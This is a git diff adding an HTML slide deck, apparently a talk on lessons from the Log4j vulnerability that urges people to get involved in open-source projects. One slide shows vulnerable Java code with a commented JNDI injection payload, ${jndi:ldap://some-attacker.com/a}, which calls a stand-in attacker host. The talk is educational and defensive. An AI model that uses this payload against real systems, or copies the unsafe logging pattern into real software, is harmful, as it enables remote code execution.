@@ -1,0 +1,320 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>Stopping Future Log4j Like Security Issues</title>
+
+    <link rel="stylesheet" href="css/reveal.css">
+    <link rel="stylesheet" href="css/theme/white.css">
+    <link rel="shortcut icon" href="#" />
+
+    <!-- Theme used for syntax highlighting of code -->
+    <link rel="stylesheet" href="lib/css/zenburn.css">
+
+    <!-- Printing and PDF exports -->
+    <script>
+        var link = document.createElement('link');
+        link.rel = 'stylesheet';
+        link.type = 'text/css';
+        link.href = window.location.search.match(/print-pdf/gi) ? 'css/print/pdf.css' : 'css/print/paper.css';
+        document.getElementsByTagName('head')[0].appendChild(link);
+    </script>
+    <script type="text/x-mathjax-config">
+         MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}});
+
+
+
+
+    </script>
+</head>
+<body>
+<div class="reveal">
+    <div class="slides">
+
+        <!-- TITLE-->
+        <section>
+            <h2>
+                How can we keep Log4j security issues from happening in the future?
+            </h2>
+            <h4>
+                Get involved and help with Open Source Software.
+            </h4>
+            <br>
+                <small>Created by
+                    <a href="https://github.com/chtompki">
+                        Rob Tompkins (chtompki)</a></small><br/>
+                <small>Presentation Address: <a href="http://www.robtompkins.com/2022-log4j-learnings-shiftleft">
+                    http://www.robtompkins.com/2022-log4j-learnings-shiftleft</a></small>
+            </p>
+        </section>
+
+        <!-- SLIDE 1 -->
+        <section>
+            <h2>Who is this guy?</h2>
+            <ul>
+                <li class="fragment">Mathematician and Logician by schooling.</li>
+                <li class="fragment">Software and Infrastructure Developer in Java, Python, DevOps, and Security.</li>
+                <li class="fragment">Worked in financial and news sectors.</li>
+                <li class="fragment">Project management committee for Apache Commons, Apache Member, and VP Jakarta EE Relations.</li>
+                <li class="fragment">Adventure sports athlete (whitewater kayaking, rock climbing, and mountain biking).</li>
+            </ul>
+        </section>
+
+        <!-- SLIDE 2 -->
+        <section>
+            <p>
+                <img src="images/sunshineLeft.jpeg" style="max-width: 600px;"/>
+            </p>
+        </section>
+
+        <!-- SLIDE 3 -->
+        <section>
+            <p>
+                <img src="images/elCap.jpeg" style="max-width: 300px;"/>
+            </p>
+        </section>
+
+        <!-- SLIDE 4 -->
+        <section>
+            <p>
+                <img src="images/canalDrop.jpeg" style="max-width: 600px;"/>
+            </p>
+        </section>
+
+        <!-- SLIDE 5 -->
+        <section>
+            <h2>Before we get started, does anyone not know what an open source project is?</h2>
+            <p class="fragment"><a href="https://opensource.org/faq#osd">Definition: https://opensource.org/faq#osd</a></p>
+        </section>
+
+
+
+        <!-- SLIDE 6 -->
+        <section>
+            <h2>The log4j exlpoit?</h2>
+            <pre class="fragment"><code class="java">public void handle(HttpExchange he) throws IOException {
+    String apiVersion = he.getRequestHeader("X-Api-Version");
+    // This line triggers the RCE by
+    // logging the attacker-controlled HTTP header.
+    // The attacker can set their X-Api-Version
+    // header to: ${jndi:ldap://some-attacker.com/a}
+    log.info("Requested Api Version:{}", apiVersion);
+    String response = "&lt;h1&gt;Hello from: "
+                + apiVersion + "!&lt;/h1&gt;";
+    he.sendResponseHeaders(200, response.length());
+    OutputStream os = he.getResponseBody();
+    os.write(response.getBytes());
+    os.close();
+  }
+</code></pre>
+        </section>
+
+        <!-- SLIDE 7 -->
+        <section>
+            <h2>What versions of Log4j are affected?</h2>
+            <ul>
+                <li class="fragment">Almost all versions of log4j version 2 are affected.</li>
+                <li class="fragment">2.0-beta9 <= Apache log4j <= 2.14.1</li>
+            </ul>
+        </section>
+
+        <!-- SLIDE 8 -->
+        <section>
+            <h2>How bad is the "bleeding"?</h2>
+            <ul>
+                <li class="fragment">Luckily Sonatype has a dashboard for us.</li>
+            </ul>
+            <p class="fragment">
+                <img src="images/sonatypeDash.png" style="max-width: 600px;"/>
+            </p>
+        </section>
+
+        <!-- SLIDE 9 -->
+        <section>
+            <h2>Here's the URL to the Dashboard</h2>
+            <p>
+                <a href="https://www.sonatype.com/resources/log4j-vulnerability-resource-center">https://www.sonatype.com/resources/log4j-vulnerability-resource-center</a>
+            </p>
+        </section>
+
+        <!-- SLIDE 10 -->
+        <section>
+            <h2>Issues that need to be fixed long term</h2>
+            <ol>
+                <li class="fragment">Remediation of production software containing the bug!</li>
+                <li class="fragment">We in the Open Source world need more help finding bugs!!!!</li>
+                <li class="fragment">Come help! Find me and ask how you can get involved.</li>
+            </ol>
+
+        </section>
+
+        <!-- SLIDE 11 -->
+        <section>
+            <h2>Why not write internal libraries?</h2>
+            <ul>
+                <li class="fragment">Standardization of libraries.</li>
+                <li class="fragment">More eyes = fewer bugs.</li>
+                <li class="fragment">Long term support.</li>
+            </ul>
+        </section>
+
+        <!-- SLIDE 12 -->
+        <section>
+            <h2>[Benedikt] Ritter's Law</h2>
+            <p class="fragment">
+                Everything that is not part of our domain/business logic or the crazy legacy
+                systems with which we need to integrate has already been developed by somebody
+                much smarter than we are....
+            </p>
+            <p class="fragment">
+                <strong>Don't re-invent the wheel!</strong>
+            </p>
+        </section>
+
+        <!-- SLIDE 13 -->
+        <section>
+            <h2>Why did I get involved?</h2>
+            <ol>
+                <li class="fragment">I thought that I would have "spare time" during the paternity leave for my second daughter's birth.</li>
+                <li class="fragment">To keep my mathematics sharp(er).</li>
+                <li class="fragment">Career advancement?</li>
+                <li class="fragment">You're not constrained by timelines...you can get it right.</li>
+            </ol>
+        </section>
+
+        <!-- SLIDE 14 -->
+        <section>
+            <h2>Ok, so what do you do to get involved?</h2>
+            <ol>
+                <li class="fragment">Pick a subject that you're passionate about.</li>
+                <li class="fragment">Pick a project that you already work with regularly.</li>
+                <li class="fragment">If it's on git check the stats page to see who
+                    frequent committers are. For example consider
+                    <a href="https://github.com/apache/commons-lang/graphs/contributors">this github
+                        contributors page</a></li>
+            </ol>
+        </section>
+
+        <!-- SLIDE 15 -->
+        <section>
+            <p>
+                <img src="images/commons-lang-contributors.png" style="max-width: 600px;"/>
+            </p>
+        </section>
+
+        <!-- SLIDE 16 -->
+        <section>
+            <h2>How to ask people what to work on?</h2>
+            <ol>
+                <li class="fragment">Find emails or mailing lists.</li>
+                <ul>
+                    <li class="fragment">For example consider this link from the <code>[lang]</code>
+                        <a href="https://github.com/apache/commons-lang/blob/master/README.md">README.md</a>:
+                        <a href="https://commons.apache.org/mail-lists.html">user mailing list</a>.
+                    </li>
+                </ul>
+                <li class="fragment">Email someone directly.</li>
+            </ol>
+        </section>
+
+        <!-- SLIDE 17 -->
+        <section>
+            <p>
+                <img src="images/mail-lists.png" style="max-width: 800px;"/>
+            </p>
+        </section>
+
+        <!-- SLIDE 18 -->
+        <section>
+        <h2>Regarding privileges</h2>
+        <h4>(commit, voting, establishing votes, ect.)</h4>
+            <p class="fragment">
+                <br/>
+                Clearly this is all community dependent, but commons (and Apache generally) has the following:
+            </p>
+            <ul>
+                <li class="fragment"><strong>user</strong> - anyone consuming the software.</li>
+                <li class="fragment"><strong>contributor</strong> - anyone who has made a contribution.</li>
+                <li class="fragment">
+                    <strong>committer</strong> - anyone who can commit directly
+                    <ul>
+                        <li class="fragment">Can make any changes to site or component.</li>
+                        <li class="fragment">Can present votes.</li>
+                        <li class="fragment">Can perform releases (according to the process).</li>
+                    </ul>
+                </li>
+            </ul>
+        </section>
+
+        <!-- SLIDE 19 -->
+        <section>
+            <h2>Regarding privileges</h2>
+            <h4>(commit, voting, establishing votes, ect.)</h4>
+            <ul>
+                <li class="fragment"><strong>committee member</strong> - has voting privileges
+                    <ul>
+                        <li class="fragment">Voting privileges particularly matter with releases, new components,
+                            and such.
+                        </li>
+                        <li class="fragment">Proposing new committers.</li>
+                    </ul>
+                </li>
+                <li class="fragment"><strong>committee chair</strong> - prepares the quarterly reports......ugh.</li>
+            </ul>
+        </section>
+
+        <!-- SLIDE 19 -->
+        <section>
+            <h2>Other Open Source Security Measures</h2>
+            <ul>
+                <li class="fragment">Static analysis software:
+                    <ol>
+                        <li class="fragment">Formatting/readability (e.g. Checkstyle or linting)</li>
+                        <li class="fragment">Security analysis (e.g. ShiftLeft, others)</li>
+                        <li class="fragment">Dependency Mapping (e.g Dependabot)</li>
+                    </ol>
+                </li>
+            </ul>
+        </section>
+
+        <!-- SLIDE 20 -->
+        <section>
+            <h1>Questions?</h1>
+        </section>
+    </div>
+</div>
+
+<script src="lib/js/head.min.js"></script>
+<script src="js/reveal.js"></script>
+
+<script>
+    // More info https://github.com/hakimel/reveal.js#configuration
+    Reveal.initialize({
+        history: true,
+
+        // More info https://github.com/hakimel/reveal.js#dependencies
+        dependencies: [
+            {src: 'plugin/markdown/marked.js'},
+            {src: 'plugin/markdown/markdown.js'},
+            {src: 'plugin/math/math.js', async: true},
+            {src: 'plugin/notes/notes.js', async: true},
+            {
+                src: 'plugin/highlight/highlight.js',
+                async: true,
+                callback: function () {
+                    hljs.initHighlightingOnLoad();
+                }
+            }
+        ],
+
+        math: {
+            mathjax: 'https://cdn.mathjax.org/mathjax/latest/MathJax.js',
+            config: 'TeX-AMS_HTML-full'  // See http://docs.mathjax.org/en/latest/config-files.html
+        }
+    });
+</script>
+</body>
+</html>
